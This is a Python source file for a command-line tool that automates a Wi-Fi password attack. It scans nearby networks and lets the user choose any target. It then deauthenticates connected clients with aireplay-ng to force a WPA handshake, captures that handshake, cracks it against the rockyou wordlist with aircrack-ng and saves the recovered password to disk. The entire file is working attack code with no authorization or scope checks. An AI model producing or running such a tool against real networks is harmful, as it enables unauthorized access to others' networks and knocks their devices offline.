#!/usr/bin/env python3

from rich.console import Console
import subprocess
import time
import os
import shutil
from datetime import datetime
from modules.utils import (
    get_interface,
    setup_monitor_mode,
    get_data_path,
    cleanup_temp_files
)

class HandshakeCaptureV2:
    def __init__(self):
        self.console = Console()
        self.interface = None
        self.target_bssid = None
        self.target_channel = None
        self.target_essid = None
        self.capture_file = None
        self.data_path = self._setup_data_paths()

    def _setup_data_paths(self):
        """Setup required data directories"""
        paths = {
            'captures': get_data_path('handshakes', ''),
            'passwords': get_data_path('passwords', '')
        }
        
        for path in paths.values():
            os.makedirs(path, exist_ok=True)
        
        return paths

    def scan_networks(self):
        """Scan for available networks"""
        try:
            # Create temporary file for scan results
            temp_file = f"/tmp/scan_{int(time.time())}"
            
            # Start airodump-ng scan
            scan_cmd = [
                'airodump-ng',
                '--output-format', 'csv',
                '--write', temp_file,
                self.interface
            ]
            
            self.console.print("\n[yellow]Scanning for networks (10 seconds)...[/yellow]")
            
            scan_process = subprocess.Popen(
                scan_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            time.sleep(10)  # Scan for 10 seconds
            scan_process.terminate()
            time.sleep(1)  # Wait for files to be written
            
            networks = []
            try:
                with open(f"{temp_file}-01.csv", 'r', encoding='utf-8') as f:
                    lines = f.readlines()
                    
                    for line in lines[2:]:  # Skip headers
                        if line.strip() and ',' in line:
                            parts = line.strip().split(',')
                            if len(parts) >= 14:  # Valid network line
                                essid = parts[13].strip()
                                if essid and essid != "":  # Only add networks with valid ESSID
                                    networks.append({
                                        'bssid': parts[0].strip(),
                                        'channel': parts[3].strip(),
                                        'essid': essid
                                    })
            except:
                pass
            finally:
                # Cleanup
                os.system(f"rm -f {temp_file}*")
            
            return networks
            
        except Exception as e:
            self.console.print(f"[red]Error scanning networks: {str(e)}[/red]")
            return []

    def select_target(self, networks):
        """Let user select target network"""
        if not networks:
            self.console.print("[red]No networks found![/red]")
            return False
            
        self.console.print("\n[green]Available Networks:[/green]")
        for idx, network in enumerate(networks, 1):
            self.console.print(
                f"{idx}. {network['essid']} "
                f"(BSSID: {network['bssid']}, "
                f"Channel: {network['channel']})"
            )
        
        while True:
            try:
                choice = int(input("\nSelect target network (1-{}): ".format(len(networks))))
                if 1 <= choice <= len(networks):
                    network = networks[choice - 1]
                    self.target_bssid = network['bssid']
                    self.target_channel = network['channel']
                    self.target_essid = network['essid']
                    return True
            except ValueError:
                pass
            self.console.print("[red]Invalid choice![/red]")
        
        return False

    def capture_handshake(self):
        """Capture WPA handshake using targeted deauth"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            self.capture_file = os.path.join(
                self.data_path['captures'],
                f'handshake_{self.target_bssid.replace(":", "")}_{timestamp}'
            )
            
            # Start airodump-ng to capture handshake
            capture_cmd = [
                'airodump-ng',
                '--bssid', self.target_bssid,
                '--channel', self.target_channel,
                '--write', self.capture_file,
                '--output-format', 'pcap',
                self.interface
            ]
            
            capture_process = subprocess.Popen(
                capture_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            # Wait for airodump-ng to initialize
            time.sleep(2)
            
            # Get connected clients
            clients = self.get_connected_clients()
            
            if clients:
                self.console.print(f"\n[green]Found {len(clients)} connected clients[/green]")
                
                # Send deauth to each client
                for client in clients:
                    self.console.print(f"[cyan]Deauthenticating client: {client}[/cyan]")
                    
                    # Send 10 deauth packets
                    for _ in range(10):
                        deauth_cmd = [
                            'aireplay-ng',
                            '--deauth', '1',
                            '-a', self.target_bssid,
                            '-c', client,
                            self.interface
                        ]
                        subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        time.sleep(0.1)
                        
                        # Check for handshake
                        if self.verify_handshake():
                            capture_process.terminate()
                            return True
                    
                    time.sleep(0.5)  # Wait between clients
            else:
                self.console.print("\n[yellow]No clients found. Sending broadcast deauth...[/yellow]")
                
                # Send broadcast deauth
                for _ in range(10):
                    deauth_cmd = [
                        'aireplay-ng',
                        '--deauth', '1',
                        '-a', self.target_bssid,
                        self.interface
                    ]
                    subprocess.run(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    time.sleep(0.1)
                    
                    # Check for handshake
                    if self.verify_handshake():
                        capture_process.terminate()
                        return True
            
            capture_process.terminate()
            return self.verify_handshake()
            
        except Exception as e:
            self.console.print(f"[red]Error capturing handshake: {str(e)}[/red]")
            return False

    def get_connected_clients(self):
        """Get list of connected clients"""
        try:
            clients = set()
            temp_file = f"/tmp/clients_{int(time.time())}"
            
            # Monitor for clients
            monitor_cmd = [
                'airodump-ng',
                '--bssid', self.target_bssid,
                '--channel', self.target_channel,
                '--write', temp_file,
                '--output-format', 'csv',
                self.interface
            ]
            
            process = subprocess.Popen(
                monitor_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            
            time.sleep(5)  # Monitor for 5 seconds
            process.terminate()
            
            # Parse results
            try:
                with open(f"{temp_file}-01.csv", 'r') as f:
                    lines = f.readlines()
                    
                    client_section = False
                    for line in lines:
                        if 'Station MAC' in line:
                            client_section = True
                            continue
                        if client_section and line.strip() and ',' in line:
                            parts = line.strip().split(',')
                            if len(parts) >= 6 and parts[5].strip() == self.target_bssid:
                                clients.add(parts[0].strip())
            except:
                pass
            finally:
                os.system(f"rm -f {temp_file}*")
            
            return list(clients)
            
        except Exception as e:
            self.console.print(f"[red]Error getting clients: {str(e)}[/red]")
            return []

    def verify_handshake(self):
        """Verify if handshake was captured"""
        try:
            capfile = f"{self.capture_file}-01.cap"
            if not os.path.exists(capfile):
                return False
                
            # Check with aircrack-ng
            cmd = ['aircrack-ng', capfile]
            process = subprocess.run(cmd, capture_output=True, text=True)
            return "1 handshake" in process.stdout
            
        except Exception as e:
            self.console.print(f"[red]Error verifying handshake: {str(e)}[/red]")
            return False

    def crack_handshake(self, wordlist="/usr/share/wordlists/rockyou.txt"):
        """Attempt to crack the captured handshake"""
        try:
            if not os.path.exists(wordlist):
                self.console.print(f"[red]Wordlist not found: {wordlist}[/red]")
                return False
                
            capfile = f"{self.capture_file}-01.cap"
            if not os.path.exists(capfile):
                self.console.print("[red]Capture file not found![/red]")
                return False
            
            # Output file for password
            password_file = os.path.join(
                self.data_path['passwords'],
                f'password_{self.target_bssid.replace(":", "")}.txt'
            )
            
            self.console.print("\n[yellow]Attempting to crack password...[/yellow]")
            
            crack_cmd = [
                'aircrack-ng',
                '-w', wordlist,
                '-l', password_file,
                '-b', self.target_bssid,
                capfile
            ]
            
            process = subprocess.Popen(
                crack_cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            password_found = False
            while True:
                line = process.stdout.readline()
                if not line and process.poll() is not None:
                    break
                    
                if "KEY FOUND!" in line:
                    password_found = True
                    break
                elif "Tested" in line:
                    self.console.print(f"[cyan]{line.strip()}[/cyan]", end='\r')
            
            if password_found and os.path.exists(password_file):
                with open(password_file, 'r') as f:
                    password = f.read().strip()
                    
                self.console.print(f"\n[green]Password found: {password}[/green]")
                
                # Save detailed results
                results_file = os.path.join(
                    self.data_path['passwords'],
                    f'details_{self.target_bssid.replace(":", "")}.txt'
                )
                
                with open(results_file, 'w') as f:
                    f.write(f"Network: {self.target_essid}\n")
                    f.write(f"BSSID: {self.target_bssid}\n")
                    f.write(f"Password: {password}\n")
                    f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                
                return True
            
            self.console.print("\n[red]Password not found in wordlist![/red]")
            return False
            
        except Exception as e:
            self.console.print(f"[red]Error cracking handshake: {str(e)}[/red]")
            return False

    def start_capture(self):
        """Main method to start handshake capture process"""
        try:
            # Get interface
            self.interface = get_interface()
            if not self.interface:
                return
            
            # Setup monitor mode
            self.interface = setup_monitor_mode(self.interface)
            if not self.interface:
                self.console.print("[red]Failed to enable monitor mode![/red]")
                return
            
            # Scan networks
            networks = self.scan_networks()
            if not self.select_target(networks):
                return
            
            self.console.print(f"\n[cyan]Starting capture for {self.target_essid}[/cyan]")
            
            if self.capture_handshake():
                self.console.print("\n[green]Handshake captured successfully![/green]")
                
                # Ask to crack
                if input("\nAttempt to crack the password? (y/n): ").lower() == 'y':
                    self.crack_handshake()
            else:
                self.console.print("\n[red]Failed to capture handshake![/red]")
            
        except KeyboardInterrupt:
            self.console.print("\n[yellow]Capture stopped by user[/yellow]")
        except Exception as e:
            self.console.print(f"[red]Error: {str(e)}[/red]")
        finally:
            # Cleanup
            try:
                subprocess.run(['airmon-ng', 'stop', self.interface],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
                cleanup_temp_files()
            except:
                pass 